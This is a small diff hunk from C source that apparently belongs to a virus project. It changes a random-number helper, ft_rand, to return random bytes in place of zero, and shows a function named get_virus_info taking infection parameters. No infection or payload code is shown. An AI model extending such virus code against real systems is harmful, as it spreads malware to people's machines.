@@ -26,7 +26,7 @@ int randomize(char k[16]){
 uint32_t ft_rand(){
 	char k[16];
 	randomize(k);
-	return 0;//((uint32_t*)k)[0];
+	return ((uint32_t*)k)[0];
 }
 
 int get_virus_info(InfectParams *p){
